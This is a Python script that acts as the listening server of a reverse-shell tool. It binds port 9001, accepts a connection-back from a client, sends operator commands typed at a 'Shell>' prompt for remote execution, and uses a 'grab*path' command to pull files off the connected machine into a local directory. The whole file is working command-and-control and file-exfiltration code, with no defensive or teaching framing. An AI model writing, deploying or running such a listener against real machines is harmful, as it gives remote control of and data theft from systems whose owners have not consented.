import os
import socket
#  Test if its running netstat -antp | grep 8080
#  on windows netstat -ano
#  The tcp client should be run on linux only

def transfer(conn, command):
        print("Transfer File")
        print(conn)
        print(command)
        print(command.encode())
        #Send the command ie grab*test.txt to the client
        conn.send(command.encode())
        
        # Split out the path ie grab*text.txt will return 
        grab, path = command.split("*")
        print("The grab",grab)
        print("The path is",path)
        
        f=open("/home/tech/" +path, "wb") # Change this to suit your linux machine
        while True:
                bits = conn.recv(1024)
                if bits.endswith("DONE".encode()):
                        f.write(bits[:-4])
                        f.close()
                        print("[+] Transfer completed")
                        break
                if "File not found".encode() in bits:
                        print("[-] Unable to find oy the file")
                        break
                f.write(bits)

def connect():
        print("[+] - Attempting to connect to server connection...")
        s = socket.socket()
        s.bind(("0.0.0.0", 9001))
        s.listen(1)
        conn, addr = s.accept()
        
        print(" The connection", conn)
        print ("[+] We got a connection from",addr)
    
        while True:
                command = input("Shell>")
                if "terminate" in command:
                        conn.send("terminate".encode())
                        conn.close()
                        break
                if command == "":
                        print("You need to enter something!")
                elif 'grab' in command:
                        transfer(conn, command)
                else:
                        conn.send(command.encode())
                        print (conn.recv(1024).decode())
def main():
        connect()
    
main()
    